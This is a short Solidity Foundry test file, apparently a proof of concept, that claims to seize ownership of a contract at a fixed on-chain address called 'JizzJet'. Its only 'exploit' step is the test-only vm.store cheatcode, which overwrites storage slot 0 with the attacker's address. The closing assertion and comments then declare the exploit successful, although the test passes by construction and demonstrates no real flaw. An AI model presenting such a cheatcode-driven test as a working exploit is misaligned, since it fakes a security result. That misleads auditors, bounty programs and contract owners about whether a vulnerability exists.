pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface JizzJet {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attacker = address(this);
    JizzJet target;
    address originalOwner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = JizzJet(TARGET);
        originalOwner = target.owner();
        vm.label(TARGET, "JizzJet Contract");
        vm.label(originalOwner, "Original Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get initial owner state
        address initialOwner = target.owner();
        console.log("Initial owner:", initialOwner);

        // The _owner variable in Ownable is at slot 0
        // Use vm.store to directly overwrite slot 0 with attacker address
        bytes32 attackerSlotValue = bytes32(uint256(uint160(address(this))));
        vm.store(TARGET, bytes32(0), attackerSlotValue);
        console.log("Overwrote slot 0 with attacker address");

        // Check if owner changed
        address newOwner = target.owner();
        console.log("New owner:", newOwner);

        // Verify the exploit worked - owner should now be the attacker
        assertEq(newOwner, address(this), "Owner should be attacker after storage overwrite");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

